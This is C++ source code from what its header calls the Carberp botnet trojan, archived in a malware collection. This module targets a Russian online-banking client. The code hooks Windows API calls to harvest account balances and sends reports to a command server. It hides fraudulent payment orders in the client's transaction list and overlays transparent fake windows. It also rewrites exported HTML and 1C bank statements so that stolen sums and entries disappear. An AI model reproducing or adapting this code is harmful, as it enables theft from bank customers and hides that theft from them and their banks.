/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"

#include "Utils.h"
#include "WndUtils.h"
#include "BotHTTP.h"

//#include "Inject.h"
#include "ntdll.h"
#include "commctrl.h"
#include "BotHTTP.h"
#include "Config.h"
#include "rafa.h"
#include "AzConfig.h"
#include "Splice.h"

#include "BotDebug.h"


namespace DBGRAFADLL
{
	#include "DbgTemplates.h"
}

#define DBGRAFA DBGRAFADLL::DBGOutMessage<>

#define RafaDllModule //������� ��� ������ �������

//�� ����� ��������� ��
//#define TEST_NOTAZ

namespace Rafa
{

LRESULT (WINAPI *pHandlerSendMessageA)(HWND , UINT , WPARAM , LPARAM );
HWND	(WINAPI *pHandlerCreateWindowExA) (DWORD,PCHAR,PCHAR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);
BOOL (WINAPI *pHandlerTrackPopupMenu)(HMENU hMenu, UINT uFlags, int x, int y, int nReserved, HWND hWnd, const RECT* prcRect ); 
HANDLE (WINAPI *pHandlerCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
							  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
BOOL (WINAPI *pHandlerCloseHandle)(HANDLE hObject);
BOOL (WINAPI *pHandlerWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);

WNDPROC MainWndProc; //������� ��������� �������� ���� �������
WNDPROC PaymentWndProc; //������� ��������� ���� ����� ��������

//������� �����, ��� ��������������� ���������� ����� �������
struct ControlForm
{
	const char* name; //�������� ��� ��������, ��� ��� ������������� � ���������
	int x, y, w, h; //������������ �������� �� ����� (��� ������, �������� ������)
	const char* captionText;
	DWORD captionHash; //���� ��� �� ������, �� ���� �� captionText
	const char* classText;
	DWORD classHash;
};

//���������� �� ��������� ��������
struct ControlFinded
{
	HWND wnd;
	ControlForm* info;
};

struct PaymentOrder
{
	char* sendAcc; //���� �����������
	char* sum; //�����
	char* inn;
	char* kpp;
	char* bik;
	char* recvAcc; //���� ����������
	char* recvName; //�������� ����������
	char* comment; //���������� �������
	char* nds;
	char* bankName; //������������ ����� ����������
	char* bankCity; //����� ����� ����������
	char* bankAcc; //���� ����� ����������
	bool entered; //�������� ��������� (�������)
	char* balans; //������ �� ����� �������� ��������, ��������� ������ ������ ���� � �����
	char  reserve[32]; //����� �� ������� ����������
	char  mem[1024]; //������ ��� ������, ���� ��������� ��������� ����
};

//��������� ���� � ��� ������
struct AccountBalans
{
	char acc[24]; //��������� ����
	char balans[24]; //������� �� �����
	char showBalans[24]; //������������ ������ (� ����������� ��������� ��������), ������� ����� �����������
};

//��������� ������� � ������
struct TreeAccount
{
	char acc[24]; //����� �����
	HTREEITEM itemAcc; //����� �����
	HTREEITEM itemTmpls; //����� ��������
};

//���� ������� ����
enum TypeFileReport
{
	ReportNothing,
	ReportInfoOperaions, //������� �� ���������
	ReportTxt, //���� ����������� ��������� ����
	ReportXml, //���� ����������� xml ����
	ReportFormatClientBank, //������� ��� ������-�����
	ReportFormat1C, //������� ��� 1C
	ReportFormatXml //������� � xml �������
};

//����� ����������� �����
struct FileReport
{
	HANDLE file; //���� ������
	TypeFileReport type; //��� ������
	char* text; //����������� �����, ������ ���������� ������ �� 1 ������, ��� ���������� 0
	int len; //����� ������
};

static void GrabBalansFromMemoText(char* s);
static void GrabBalansFromLVM( int cln, char* s );
static void LoadPaymentOrders(); //�������� ����������� �������� �� �����, ����� �� ����� ��������
static void SavePaymentOrders(); //���������� ��������
static PaymentOrder* GetPaymentOrders(); //������ ����� �������� � �������
static void DBGPrintPayment( PaymentOrder* po ); //������ ���������� (���������) �������� ��� ������
static void RelocPayment( char* base ); //��������������� ������ � ������� paymentOrders ����� ������������� ������ ��� �������� �� �����
static int BalansToInt( const char* s, int format = 0 );
static char* IntToBalans( int v, char* s, int format = 0 );
static bool FindTreeList();

HWND IEWnd = 0; //���� �� � ������� ���� ��� ������ ��� ����
DWORD PID = 0; //��� ��������� 2-�� �������
char LVM_Acc[32]; //��������� ���� � �������
int fromLVM = 0;  //���� ����� 1, �� �������� ����� � ������� (��. ������� GrabBalansFromLVM)
HWND treeView = 0, listView = 0, toolBar = 0;
int idBtNewDoc = 0;
int idBtDelivery = 0; //������ �� ������� ��������
bool offBtDelivery = false; //��������� ������ ��������, ����� ���������� ������ � ������������
POINT posBtNewDoc, posBtDelivery;
int stateFakeWindow = 0;
PaymentOrder* paymentOrders = 0; //��������� ���������
int c_paymentOrders = 0; //���������� ���������� (����������) ��������
AccountBalans findedBalans[8]; //��������� ����� � ���������
int c_findedBalans = 0; //���������� ��������� ������
const char* prophylaxisText = "�� ������ ������ ��� ������� ��������� ����������, ��� ��� �� ������� ���������� ���������������� ������. "
							  "���������� ����� ��������� �����.\n�������� �� ������������ ����������.";

//���������� ��� ������� ��������
int paramRows[400]; //������ ������ �������� �������� �� �������� ����������� ������ (�� �� ������), ������� ��� ������� ������ � ���� ��������
int c_lvRows = 0; //���������� ����� � lvRows, ������������ �� ��������� LVM_INSERTITEM
int begHideRows = 0; //� ����� ������ ���������� ��������� ������
int identHidePayment = 0; //�����: 1 - ������ ����������, 2 - ������� �����, 4 - ������� ����������
const int fullIdent = 1 + 2 + 4; //��� ���� �������� �������, ��� ���� �������� ����������������
char filePayments[MAX_PATH]; //���� � ������� ������ ���� � �������������� ���������

int retMenuNds = 0; //������������ �������� ��� ������ ���� ���

int widthScreen, heightScreen;

//������ ����������� �������, ����������� �� ��������� ������������ �����������, 
//�� �� ����� ���� ������ ������������� ������ ����
const int maxFileReports = 5;
FileReport fileReports[maxFileReports];

//char domain[128]; //����� �������

//�������� ����� "��������� ���������"
ControlForm controlsPaymentOrder[] = 
{
	{ "form",	 0, 0, 606, 569,  "�������� ���������", 0x505B8A7A, "Canvas",  0 },
	{ "num",	 168, 0, 50, 25,  0,					 0,			 0,			0xCB934F4 /* edit */}, //����� ���������
	{ "express", 169, 29, 67, 16, 0,					 0xEEFB4590 /* ������� */, 0, 0x5E9D34F9 /* button */}, //������� �������
	{ "date",	 238, 1, 82, 24,  0,					 0,          0,         0xD3CC2481 /* sysdatetimepick32 */ }, //����
	{ "typepayment", 339, 1, 102, 302, 0,                0,          0,			0x2D3F0896 /* combobox */}, //��� �������
	{ "status",	 486, 0, 22, 25,  0,                     0,          0,         0xCB934F4 /* edit */}, //������ �����������
	{ "innsend", 40, 106, 124, 25,0,                     0,          0,         0xCB934F4 /* edit */}, //��� �����������
	{ "kppsend", 240, 106, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //��� �����������
	{ "namesend", 93, 133, 234, 25, 0,                   0,          0,         0xCB934F4 /* edit */}, //�������� �����������
	{ "sum",     414, 105, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //�����
	{ "nds",     553, 106, 31, 22, 0,                    0xFFF36251 /* ��� */, 0, 0x5E9D34F9 /* button */}, //������ ���
	{ "innrecv", 40, 234, 124, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //��� ����������
	{ "kpprecv", 240, 234, 87, 27, 0,                    0,          0,         0xCB934F4 /* edit */}, //��� ����������
	{ "accountrecv", 415, 234, 154, 25,	0,				 0,          0,         0xCB934F4 /* edit */}, //���� ����������
	{ "namerecv", 91, 262, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //������������ ����������
	{ "bikrecv", 415, 262, 154, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //��� ����������
	{ "bankrecv", 91, 288, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //���� ����������
	{ "accbankrecv", 415, 288, 154, 25, 0,               0,          0,         0xCB934F4 /* edit */}, //���� ����� ����������
	{ "punktrecv", 111, 314, 217, 25, 0,				 0,          0,         0xCB934F4 /* edit */}, //���������� ����� ����������
	{ "daterecv", 486, 315, 82, 24, 0,                   0,			 0,			0xD3CC2481 /* sysdatetimepick32 */ }, //���� ����������
	{ "queue",    475, 343, 93, 210, 0,					 0,			 0,			0x2D3F0896 /* combobox */}, //������� �������
	{ "comment",  9, 408, 579, 97, 0,					 0,          0,         0xCB934F4 /* edit */}, //���������� �������
	{ "save",     415, 511, 75, 25, 0,					 0x23981105 /* ��������� */, 0, 0x5E9D34F9 /* button */}, //������ ���������
	{ "sended",   200, 518, 81, 16, 0,                   0xAC3A81FF /* � �������� */, 0, 0x5E9D34F9 /* button */}, //������� � ��������
	{ 0 }
};

//�������� ���� ������������� ����� ������� ������ ��������
ControlForm formConfirmation =
{
	0, 0, 0, 0, 0, "���������� �� ������������ ����������", 0x7DE3292D, "VControl", 0
};

//���������� ���� wnd � ����������� �� ControlFinded, ���� ���������, �� ���������� true
static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf );

static void SendLogToAdmin( int num, const char* text = 0 )
{
	string Host = GetAzHost(true);
	TMemory qr(1024);
	const char *paramText;
	char empty[1], *valText;
	fwsprintfA pwsprintfA = Get_wsprintfA();
	if( text && text[0] ) //�� ������ ������
	{
		paramText = "&text=", valText = URLEncode((char*)text);
	}
	else
		empty[0] = 0, paramText = valText = empty;
	int sz = pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=raifur&mode=setlog&log=%d%s%s", Host.t_str(), BOT_UID, num, paramText, valText );
	if( valText != empty ) STR::Free(valText);
	THTTPResponseRec Response;
	ClearStruct(Response);
	HTTP::Get( qr, 0, &Response );
	DBGRAFA( "Rafa", "������� ����: %s, text=%s", (char*)qr, text );
	HTTPResponse::Clear(&Response);
}

struct LogInfo
{
	int num;
	char text[768];
};

// ������� ���������� ��� � ��������� ������
static DWORD WINAPI SendLogToAdminThread2( LPVOID p )
{
	LogInfo* p2 = (LogInfo*)p;
	SendLogToAdmin( p2->num, p2->text );
	MemFree(p);
	return 0;
}

static DWORD WINAPI SendLogToAdminThread( int num, const char* text = 0 )
{
	LogInfo* p = (LogInfo*)MemAlloc(sizeof(LogInfo));
	if( p )
	{
		p->num = num;
		if( text )
		{
			int len = m_lstrlen(text);
			if( len > sizeof(p->text) ) len = sizeof(p->text) - 1;
			m_memcpy( p->text, text, len );
			p->text[len] = 0;
		}
		else
			p->text[0] = 0;
		StartThread( SendLogToAdminThread2, p );
	}
	return 0;
}

//��������� �������� ����� ����� �������� ����������
static void UpdateParamAfterSort()
{
	LVITEM item;
	ClearStruct(item);
	item.mask = LVIF_PARAM;
	for( int i = 0; i < c_lvRows; i++ )
	{
		item.iItem = i;
		pHandlerSendMessageA( listView, LVM_GETITEM, 0, (LPARAM)&item );
		paramRows[i] = item.lParam;
		//DBGRAFA( "Rafa", "Update %d %08x", i, item.lParam );
	}
	begHideRows = c_lvRows;
}

static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	bool update = false;
	switch ( Msg )
	{
		// ���� ��������� ����� � ��� ����� � �� EDIT (� ������ ������ ����)
		case WM_SETTEXT:
			//DBGRAFA( "Rafa", "SETTEXT: [%x] %s", hWnd, lParam ); 
			GrabBalansFromMemoText((char*)lParam);
		break;

		// ��� ������ ���������� item
		case TVM_INSERTITEM:
		{
			/*
			LPTVINSERTSTRUCT insert = (LPTVINSERTSTRUCT)lParam;
			if ( insert)
			if ( insert->item.mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_INSERTITEM: [%x] %s", hWnd, (insert->item.pszText==NULL)?"NULL":insert->item.pszText); 
			}
			*/
			break;
		}
		// ��� ������ ����������� item
		case TVM_SETITEM:
		{
			/*
			LPTVITEM	item  = (LPTVITEM)lParam;
			if ( item )
			if ( item->mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_SETITEM: [%x] %s",hWnd,(item->pszText==NULL)?"NULL":item->pszText); 
			}
			*/
			break;
		}

		// ��� ������� ���������� item
		case LVM_INSERTITEM:
		{
			LPLVITEM item = (LPLVITEM)lParam;
			if ( item == NULL)
				break;
			if ( item->mask & LVIF_TEXT && item->pszText != LPSTR_TEXTCALLBACK )
			{
				//DBGRAFA( "Rafa++++", "i = %d,%d, '%s'", item->iItem, item->iSubItem, item->pszText );
			}
			//������ ������� ������� ������������ �����
			begHideRows = c_lvRows = item->iItem + 1;
			paramRows[item->iItem] = item->lParam; //�� ����� ��������� ����������� ������, � �� �� ������ ������
			//DBGRAFA( "Rafa", "Insert %d %08x", item->iItem, item->lParam );
			break;
		}
		// ��� �������  ����������� item
		case LVM_SETITEM:
		{
			LPLVITEM item  = (LPLVITEM)lParam;
			if( item )
				if ( item->mask & LVIF_TEXT )
				{
					//DBGRAFA( "Rafa", "%d %s", item->iSubItem, item->pszText ); 
					GrabBalansFromLVM( item->iSubItem, item->pszText );
				}
			break;
		}
		case LVM_SORTITEMS:
			DBGRAFA( "Rafa", "LVM_SORTITEMS" );
			update = true;
			break;
		case LVM_GETSELECTIONMARK:
			DBGRAFA( "Rafa", "LVM_GETSELECTIONMARK" );
			return 1;
			break;
		default:
			//DBGRAFA( "Rafa", "Unknow msg %d", Msg );
			break;
	}
	LRESULT ret = (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);
	if( update )
	{
		UpdateParamAfterSort();
	}
	return ret;
}

static bool FindPaymentForIdent( const char* s, int id )
{
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		char* s2 = 0;
		switch( id )
		{
			case 0: s2 = paymentOrders[i].recvName; break;
			case 1: s2 = paymentOrders[i].sum; break;
			case 2: s2 = paymentOrders[i].comment; break;
		}
		if( s2 == 0 ) break;
		if( m_strstr( s, s2 ) ) return true;
	}
	return false;
}

/*
static LRESULT WINAPI HandlerPaymentWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	if( (stateFakeWindow & 5) == 5 )
	{
		DBGRAFA( "-------0", "%x (%08x,%08x)", Msg, wParam, lParam );
	}
	LRESULT ret = PaymentWndProc( hWnd, Msg, wParam, lParam );
	return ret;
}
*/

static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	//DBGRAFA( "Rafa", "Msg %d", Msg );
	int paramOrig, numItem;
	switch( Msg )
	{
		case WM_NOTIFY:
		{
			NMHDR* pdi = (NMHDR*)lParam;
			if( pdi->hwndFrom == listView )
			{
				switch( pdi->code )
				{
					case LVN_GETDISPINFO:
					{
						NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
						//����������� ������ ��������
						paramOrig = p->item.lParam;
						numItem = p->item.iItem;
						p->item.lParam = paramRows[p->item.iItem];
						//DBGRAFA( "Rafa", "%d %08x", numItem, p->item.lParam );
					}
					break;
					case NM_CLICK:
					case NM_DBLCLK:
					{
						NMITEMACTIVATE* p = (NMITEMACTIVATE*)lParam;
						DBGRAFA( "Rafa", "Click" );
						if( p->iItem >= begHideRows )
							return 0;
						else
							p->lParam = paramRows[p->iItem];
						if( idBtDelivery == 0 ) //��� ������ ������ ��������, �� ������ �� ����� ����� ��� ������
							FindTreeList();
					}
					break;
				}
			}
			else
				if( pdi->hwndFrom == toolBar )
				{
					switch( pdi->code )
					{
						case NM_CLICK:
						{
							NMMOUSE* p = (NMMOUSE*)lParam;
							if( p->dwItemSpec == idBtDelivery )
							{
								DBGRAFA( "Rafa", "������ ������ ��������" );
								if( offBtDelivery )
								{
									pMessageBoxA( 0, prophylaxisText, "��������!", MB_ICONWARNING );
									return 0;
								}
							}
							//DBGRAFA( "Rafa", "toolBar %d %d %d", pdi->idFrom, p->dwItemSpec, p->dwItemData );
						}
					}
				}
			break;
		}
	}
	LRESULT ret = MainWndProc( hWnd, Msg, wParam, lParam );
	switch ( Msg )
	{
		case WM_NOTIFY:
		{
			//����� ��������� LVN_GETDISPINFO ListView ����������� ������ ��� �����, � ������� ������������ ��������
			//����� �������������� �������� ������� ����� ������
			NMHDR* pdi = (NMHDR*)lParam;
			if( pdi->hwndFrom == listView )
			{
				switch( pdi->code )
				{
					case LVN_GETDISPINFO:
					{
						NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
						if( p->item.mask & LVIF_TEXT )
						{
							switch( p->item.iSubItem )
							{
								case 5: //����������
									if( FindPaymentForIdent( p->item.pszText, 0 ) )
										identHidePayment |= 1;
									else
										identHidePayment = 0; //���� �� �������, �� �������� ��������� �������������
									break;
								case 4: //�����
									if( FindPaymentForIdent( p->item.pszText, 1 ) )
										identHidePayment |= 2;
									else
										identHidePayment = 0; 
									break;
								case 6: //����������
									if( FindPaymentForIdent( p->item.pszText, 2 ) )
										identHidePayment |= 4;
									else
										identHidePayment = 0; 
									break;
							}
							if( identHidePayment == fullIdent ) //���� �������� ����������������
							{
								DBGRAFA( "Rafa", "���������������� �������� %d", numItem );
								//���� ������ �������� � ����� �������
								int idx = -1;
								for( int i = 0; i < c_lvRows; i++ )
									if( paramRows[i] == paramOrig )
									{
										idx = i;
										break;
									}
								DBGRAFA( "Rafa", "%d %08x", idx, paramOrig );
								if( idx < begHideRows ) //�������� ��� �� ������
								{
									//��������� ����� ���� �������� � ����� ���, ��������� ��������� ����
									for( int i = idx; i < c_lvRows - 1; i++ )
										paramRows[i] = paramRows[i + 1];
									begHideRows--;
									paramRows[c_lvRows - 1] = paramOrig;
									//���� ������ ��������, �� ���������� ���������
									DWORD res = (DWORD)pSendMessageA( listView, LVM_GETITEMSTATE, (WPARAM)numItem, (LPARAM)LVIS_SELECTED );
									if( res & LVIS_SELECTED )
									{
										LVITEM item;
										item.stateMask = LVIS_SELECTED;
										item.state = 0;
										pSendMessageA( listView, LVM_SETITEMSTATE, (WPARAM)-1, (LPARAM)&item );
										NMITEMACTIVATE nm;
										ClearStruct(nm);
										nm.hdr.code = NM_CLICK;
										nm.hdr.hwndFrom = listView;
										nm.hdr.idFrom = 0;
										nm.iItem = -1;
										pSendMessageA( listView, WM_NOTIFY, (WPARAM)0, (LPARAM)&nm );
									}
									pSendMessageA( listView, LVM_REDRAWITEMS, (WPARAM)0, (LPARAM)(c_lvRows - 1) );
									SendLogToAdminThread(6); //�������� � ������� ��������
									//pUpdateWindow(listView); //��������� �������
								}
								identHidePayment = 0;
							}
						}
					}
					break;
					case NM_CUSTOMDRAW:
					{
						NMLVCUSTOMDRAW* p = (NMLVCUSTOMDRAW*)lParam;
						if( p->nmcd.dwDrawStage == CDDS_PREPAINT )
						{
							ret |= CDRF_NOTIFYITEMDRAW;
						}
						if( p->nmcd.dwDrawStage == CDDS_ITEMPREPAINT ) 
						{
							if( p->nmcd.dwItemSpec >= (DWORD)begHideRows ) //��������� �������� ���� ��������
								ret = CDRF_SKIPDEFAULT;
							else
								ret = CDRF_NEWFONT;
						}
					}
				}
			}
			break;
		}
	}
	return ret;
}

static HWND WINAPI HandlerCreateWindowExA( DWORD dwExStyle, PCHAR lpClassName, PCHAR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam )
{
	HWND hWnd = pHandlerCreateWindowExA( dwExStyle, lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, 
										 hWndParent, hMenu, hInstance, lpParam );
	
	if( hWnd && (DWORD)lpClassName > 0x10000 && lpWindowName )
	{
		bool transparent = false;
		if( (stateFakeWindow & 3) == 3 ) //���� ��������� ���� ����� ����� ��������
		{
			RECT r;
			if( CmpWnd( lpWindowName, 0, lpClassName, 0, r, &controlsPaymentOrder[0] ) ) //��� ���� �������� ���������
			{
				transparent = true;
				stateFakeWindow &= ~2; //������ �� ����� ����� ��� ����
			}
		}
		else
			if( (stateFakeWindow & 5) == 5 ) //�� ����� ����� ��������, ��������� ��� ����������� ����
			{
				//DBGRAFA( "Rafa", "Window class: '%s', caption: '%s'", lpClassName, lpWindowName );
				transparent = true;
			}
		if( transparent ) //������ ���� ����������
		{
#ifdef DEBUGCONFIG
			int v = (stateFakeWindow & 16) ? 0 : 50;
			SetWindowTransparent( hWnd, v );
#else
			int v = (stateFakeWindow & 16) ? 0 : 1;
			SetWindowTransparent( hWnd, v );
#endif
		}
	}
	return hWnd;
}

static BOOL WINAPI HandlerTrackPopupMenu( HMENU hMenu, UINT uFlags, int x, int y, int nReserved, HWND hWnd, const RECT* prcRect )
{
	if( stateFakeWindow & 8 )
	{
		stateFakeWindow &= ~8; //���� �������
		return retMenuNds;
	}
	return pHandlerTrackPopupMenu( hMenu, uFlags, x, y, nReserved, hWnd, prcRect );
}

//������� CreateFileA, CloseHandle, WriteFile ������������� ��� ���������� ������ �� ���������
static HANDLE WINAPI HandlerCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
							  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
	HANDLE file = pHandlerCreateFileA( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
							  dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
	if( file != INVALID_HANDLE_VALUE && (dwDesiredAccess & GENERIC_WRITE) != 0 )
	{
		TypeFileReport type = ReportNothing;
		if( m_strstr( lpFileName, "report.html") )
		{
			DBGRAFA( "Rafa", "����������� ����� InfoOperaions '%s'", lpFileName );
			type = ReportInfoOperaions;
		}
		else
			if( m_strstr( lpFileName, ".txt" ) )
			{
				DBGRAFA( "Rafa", "����������� ���� txt '%s'", lpFileName );
				type = ReportTxt;
			}
			else
				if( m_strstr( lpFileName, ".xml" ) )
				{
					DBGRAFA( "Rafa", "����������� ���� xml '%s'", lpFileName );
					type = ReportXml;
				}
		if( type != ReportNothing )
		{
			//����� �������� ���� � ��������� ������
			for( int i = 0; i < maxFileReports; i++ )
				if( fileReports[i].file == 0 )
				{
					fileReports[i].file = file;
					fileReports[i].type = type;
					fileReports[i].text = 0;
					fileReports[i].len = 0;
					break;
				}
		}
	}
	return file;
}

static BOOL WINAPI HandlerWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
{
	for( int i = 0; i < maxFileReports; i++ )
		if( fileReports[i].file == hFile ) //��������������� �����, ����� ��� � ������
		{
			DBGRAFA( "Rafa", "� ����� ��������� ����: %d, ���� %d", nNumberOfBytesToWrite, fileReports[i].len );
			fileReports[i].text = (char*)MemRealloc( fileReports[i].text, fileReports[i].len + nNumberOfBytesToWrite + 1 );
			m_memcpy( fileReports[i].text + fileReports[i].len, lpBuffer, nNumberOfBytesToWrite );
			fileReports[i].len += nNumberOfBytesToWrite;
			fileReports[i].text[fileReports[i].len] = 0;
			if( lpNumberOfBytesWritten )
				*lpNumberOfBytesWritten = nNumberOfBytesToWrite;
			bool saved = false; //����� �� ��������� ����, �. �. ������ ����� �� ���
			if( fileReports[i].type == ReportTxt ) //����������� ��������� ����
			{
				if( fileReports[i].len > 32 ) //���������� ������ ��� �������������
				{
					if( m_strstr( fileReports[i].text, "1CClientBankExchange" ) ) //format 1C
						fileReports[i].type = ReportFormat1C;
					else
						if( m_strstr( fileReports[i].text, "HEADER" ) && m_strstr( fileReports[i].text, "F00: " ) ) //������ ������-�����
							fileReports[i].type = ReportFormatClientBank;
						else
							saved = true;

				}
			}
			else
				if( fileReports[i].type == ReportXml ) //����������� xml ����
				{
					if( fileReports[i].len > 80 ) //���������� ������ ��� �������������
						if( m_strstr( fileReports[i].text, "<AccountStatements>" ) )
							fileReports[i].type = ReportFormatXml;
						else
							saved = true;
				}
			if( saved ) //����������� ������� ������ ��������� �� ������, ������� ��������� �� ��� ����
			{
				DWORD wr;
				pHandlerWriteFile( hFile, fileReports[i].text, fileReports[i].len, &wr, 0 );
				MemFree(fileReports[i].text);
				fileReports[i].file = 0;
				fileReports[i].text = 0;
				fileReports[i].len = 0;
			}
			return TRUE;
		}
	return pHandlerWriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped );
}

static char* FindBetweenTag( char* text, const char* left, const char* right, int& sz )
{
	char* p = m_strstr( text, left );
	if( p )
	{
		int l = m_lstrlen(left);
		char* p2 = m_strstr( p + l, right );
		if( p2 )
		{
			l = m_lstrlen(right);
			sz = p2 - p + l;
			return p;
		}
	}
	return 0;
}

static void ChangeSumInfoOperaions( char* html, int addSum, int format )
{
	char* p = m_strstr( html, "<td" );
	if( p == 0 ) return;
	while( *p++ != '>' ); //���� �� ���������� ���
	char* pp = p; //������� ����� �����
	while( *p != '<' ) p++; //���� �� </td>
	*p = 0;
	//��������� �����
    int sum = BalansToInt( pp, format );
    sum += addSum;
    char sumText[32];
    IntToBalans( sum, sumText, format );
    //����� ����� �����
    char* ps = sumText;
    while( *ps != 0 ) ps++; //���� � ����� �����
    ps--; //�� ��������� ����� �����
	*p-- = '<'; //���������������
	while( ps >= sumText ) *p-- = *ps--; //������� ����� � ����� � ������
	while( *p != '>' ) *p-- = ' ';  //��������� ��������� ���� �� �������� ��������� ���
}

static void ModifyInfoOperaions( FileReport& fr )
{
	DBGRAFA( "RAFA", "����������� ������ � html �������" );
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		//�������� ����� � ���� ��� � ����� (1,234.56)
		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
		char sumText[32];
		IntToBalans( sumInt, sumText, 1 );
		char* html = fr.text;
		int state = 0;
		while( state >= 0 )
		{
			int sz;
			//������� ������ �������
			html = FindBetweenTag( html, "<tr>", "</tr>", sz );
			if( html == 0 ) break;
			char c = html[sz]; //������ � ����� ������ 0, ����� ������ �� ��� �����
			html[sz] = 0;
			switch( state )
			{
				case 0: //����� ������ � ���������
					{
						//���� �� ������ ����� � ������
						char* p = m_strstr( html, sumText );
						if( p )
						{
							//���� �� ������ ���� � ������
							p = m_strstr( p, paymentOrders[i].recvAcc );
							if( p )
							{
								//���� �� ������ ����������
								p = m_strstr( p, paymentOrders[i].comment );
								if( p )
								{
									//������� ������ � ���������, �������
									int restLen = fr.len - (html - fr.text) - sz;
									m_memcpy( html, html + sz, restLen );
									fr.len -= sz;
									html[restLen] = 0;
									state = 1; //��������� �� ����������� �������� ����
									sz = 0;
								}
							}
						}
					}
					break;
				case 1: //����� ������ � �������� ������
					{
						char* p = m_strstr( html, "����� � ������ �����" );
						if( p )
						{
							ChangeSumInfoOperaions( p, -sumInt, 1 );
							state = 2;
						}
					}
					break;
				case 2: //����� ���������� ��������
					{
						char* p = m_strstr( html, "���������� ��������" );
						if( p )
						{
							ChangeSumInfoOperaions( p, -1, 2 );
							state = 3;
						}
				    }
					break;
				case 3: //����� ���������� �������
					{
						char* p = m_strstr( html, "��������� ������� �� ����� ���" );
						if( p )
						{
							ChangeSumInfoOperaions( p, sumInt, 1 );
							state = 4;
						}
				    }
					break;
				case 4: //����� ��������� �������
					{
						char* p = m_strstr( html, "�������� ������� �� ������ ���" );
						if( p )
						{
							ChangeSumInfoOperaions( p, sumInt, 1 );
							state = 3;
						}
				    }
					break;
			}
			html[sz] = c; //���������������
			html += sz;
		}
	}
}

//���������� �� ������� ���������� ����� ������, endVal - ������ ��������� �����
static int ChangeSumForVar( char* text, int lenText, const char* var, int addSum, int format, char endVal )
{
	char* p = m_strstr( text, var );
	if( p == 0 ) return 0;
	int len = m_lstrlen(var);
	p += len;
	//���� ������ �����
	while( *p < '0' || *p > '9' ) p++;
	//���� ����� ����� 
	char* pp = p;
	while( *p != endVal ) p++;
	*p = 0;
	int sum = BalansToInt( pp, format ) + addSum;
	*p = endVal;
	char sumText[32];
	IntToBalans( sum, sumText, format ); 
	len = m_lstrlen(sumText);
	int oldLen = p - pp;
	int subLen = len - oldLen;
	//���� ������ ������ � ����� ����� ������, �� ���������� ������� ������
	if( len != oldLen )
	{
		int movedLen = lenText - (p - text); //������������ �����
		if( len < oldLen ) //����� ����� ����� ������ 
			m_memcpy( p + subLen, p, movedLen );
		else //����� ����� ����� ������
		{
			char* p2 = text + lenText;
			char* p3 = p2 + subLen;
			while( p2 >= p ) *p3-- = *p2--;
		}
	}
	//�������� �����
	p = sumText;
	while( *p ) *pp++ = *p++;
	return subLen;
}

static void ModifyFormat1C( FileReport& fr )
{
	DBGRAFA( "RAFA", "����������� ������ � 1C �������" );
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
		char sumText[32];
		IntToBalans( sumInt, sumText, 4 );
		char* html = fr.text;
		bool stop = false;
		while( !stop )
		{
			int sz;
			//������� ������
			html = FindBetweenTag( html, "��������������", "��������������", sz );
			if( html == 0 ) break;
			sz += 2; //������� ������ \r\n
			char c = html[sz]; //������ � ����� 0, ����� ������ �� ��� �����
			html[sz] = 0;
			//���� �� ������ ����� � ������
			char* p = m_strstr( html, sumText );
			if( p )
			{
				//���� �� ������ ���� � ������
				p = m_strstr( p, paymentOrders[i].recvAcc );
				if( p )
				{
					//���� �� ������ ����������
					p = m_strstr( p, paymentOrders[i].comment );
					if( p )
					{
						//������� ������ � ���������, �������
						int restLen = fr.len - (html - fr.text) - sz;
						m_memcpy( html, html + sz, restLen );
						fr.len -= sz;
						html[restLen] = 0;
						int oldLen = fr.len;
						//��������� �������� ����� � ����������� �������
						oldLen += ChangeSumForVar( fr.text, oldLen, "������������", -sumInt, 4, 'r' );
						oldLen += ChangeSumForVar( fr.text, oldLen, "���������������", sumInt, 4, 'r' );
